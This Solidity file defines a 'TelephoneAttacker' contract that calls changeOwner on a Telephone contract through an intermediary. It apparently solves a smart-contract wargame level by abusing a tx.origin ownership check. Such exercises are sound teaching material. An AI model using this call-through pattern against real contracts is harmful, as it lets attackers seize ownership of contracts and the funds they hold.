// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/Telephone.sol";

contract TelephoneAttacker {
    function attack(address _origin) public {
        Telephone(_origin).changeOwner(msg.sender);
    }
}